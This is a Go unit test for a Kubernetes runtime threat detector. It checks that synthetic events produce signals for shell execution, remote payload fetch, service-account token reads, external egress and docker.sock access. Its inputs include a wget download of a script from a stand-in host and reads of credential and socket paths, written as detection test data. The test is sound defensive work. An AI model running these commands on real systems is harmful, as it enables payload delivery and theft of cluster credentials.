package rep

import (
	"context"
	"testing"
	"time"

	"github.com/fortuna/core/pkg/models"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
)

func TestProcessRuntimeEvent_EventFactSignalChain_StatelessDetectors(t *testing.T) {
	db, err := gorm.Open(sqlite.Open("file::memory:?cache=shared"), &gorm.Config{})
	if err != nil {
		t.Fatalf("open sqlite: %v", err)
	}
	if err := db.AutoMigrate(
		&models.RuntimeEvent{},
		&models.RuntimeBehaviorFact{},
		&models.RuntimeSignal{},
		&models.RuntimeIncident{},
		&models.PodRiskProfile{},
		&models.Pod{},
		&models.PodCapability{},
		&models.CapabilityMetadata{},
	); err != nil {
		t.Fatalf("migrate: %v", err)
	}

	podUID := "stateless-chain-pod-1"
	ns := "ns"
	now := time.Now().UTC()

	inputs := []RuntimeEventInput{
		// INTERACTIVE_SHELL_EXEC
		{PodUID: podUID, Namespace: ns, Runtime: "agent", Syscall: "execve", TargetPath: "/bin/sh -c id", Timestamp: &now, Confidence: 0.9},
		// TMP_BINARY_EXECUTION + REMOTE_PAYLOAD_FETCH
		{PodUID: podUID, Namespace: ns, Runtime: "agent", Syscall: "execve", TargetPath: "/tmp/wget http://x/p.sh -O /tmp/p.sh", Timestamp: &now, Confidence: 0.9},
		// SERVICEACCOUNT_TOKEN_READ
		{PodUID: podUID, Namespace: ns, Runtime: "agent", Syscall: "openat", TargetPath: "/var/run/secrets/kubernetes.io/serviceaccount/token", Timestamp: &now, Confidence: 0.9},
		// EXTERNAL_EGRESS
		{PodUID: podUID, Namespace: ns, Runtime: "agent", Syscall: "connect", TargetPath: "dst=8.8.8.8:53 proto=udp dport=53", Timestamp: &now, Confidence: 0.9},
		// HOST_PATH_ACCESS
		{PodUID: podUID, Namespace: ns, Runtime: "agent", Syscall: "open", TargetPath: "/var/run/docker.sock", Timestamp: &now, Confidence: 0.9},
	}

	for _, in := range inputs {
		if _, err := ProcessRuntimeEvent(context.Background(), db, in); err != nil {
			t.Fatalf("ProcessRuntimeEvent failed: %v", err)
		}
	}

	var signals []models.RuntimeSignal
	if err := db.Where("pod_uid = ?", podUID).Find(&signals).Error; err != nil {
		t.Fatalf("query signals: %v", err)
	}
	if len(signals) == 0 {
		t.Fatalf("expected runtime signals, got 0")
	}

	got := map[string]bool{}
	for i := range signals {
		got[signals[i].SignalType] = true
	}
	want := []string{
		"INTERACTIVE_SHELL_EXEC",
		"SERVICEACCOUNT_TOKEN_READ",
		"EXTERNAL_EGRESS",
		"REMOTE_PAYLOAD_FETCH",
		"TMP_BINARY_EXECUTION",
		"HOST_PATH_ACCESS",
	}
	for _, s := range want {
		if !got[s] {
			t.Fatalf("expected synthesized signal %s, got=%v", s, got)
		}
	}
}
